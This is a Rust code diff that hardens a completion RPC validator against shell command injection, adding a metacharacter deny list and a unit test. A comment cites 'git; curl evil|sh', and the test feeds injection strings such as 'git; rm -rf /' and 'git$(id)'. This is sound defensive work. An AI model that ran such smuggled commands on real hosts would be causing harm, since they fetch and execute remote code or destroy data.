@@ -37,6 +37,21 @@ pub fn validate_and_clamp(req: &mut CompletionExecuteRequest) -> Result<(), Stri
     if req.command.is_empty() || req.command.contains('\0') {
         return Err("completion: invalid command".to_string());
     }
+    // `command` is concatenated raw into the remote command line (only `args`
+    // are shell-quoted). It is supposed to be a program name from fig spec
+    // data, but the RPC arm is reachable directly, so refuse shell
+    // metacharacters outright: `command: "git; curl evil|sh"` would otherwise
+    // run the second statement on the remote host with no quoting at all.
+    // Spaces stay legal (`docker compose`-style names are legitimate and inert).
+    if req
+        .command
+        .chars()
+        .any(|character| matches!(character, ';' | '|' | '&' | '$' | '`' | '(' | ')' | '<' | '>' | '\n' | '\r' | '\\' | '"' | '\'' | '\u{0}'))
+    {
+        return Err(
+            "completion: command must be a plain program name (no shell metacharacters)".to_string(),
+        );
+    }
     if req.args.len() > MAX_ARGS {
         return Err(format!("completion: too many args (max {MAX_ARGS})"));
     }
@@ -122,6 +137,25 @@ mod tests {
             validate_and_clamp(&mut req),
             Err("completion: invalid command".to_string())
         );
+    }
+
+    #[test]
+    fn rejects_command_with_shell_metacharacters() {
+        // `command` 原样拼进远端命令行（只有 args 做 shell_quote），本臂 RPC
+        // 可直接触达，所以必须拒绝元字符——否则 `git; curl evil|sh` 会在远端
+        // 执行第二条语句。
+        for evil in ["git; rm -rf /", "git|sh", "git$(id)", "git && id", "git`id`"] {
+            let mut req = request("completion-generator", evil, &[]);
+            assert!(
+                validate_and_clamp(&mut req).is_err(),
+                "{evil} should be refused"
+            );
+        }
+        // 普通程序名保持合法（含子命令形态）。
+        for good in ["git", "docker compose", "kubectl"] {
+            let mut req = request("completion-generator", good, &[]);
+            assert!(validate_and_clamp(&mut req).is_ok(), "{good} should pass");
+        }
     }
 
     #[test]
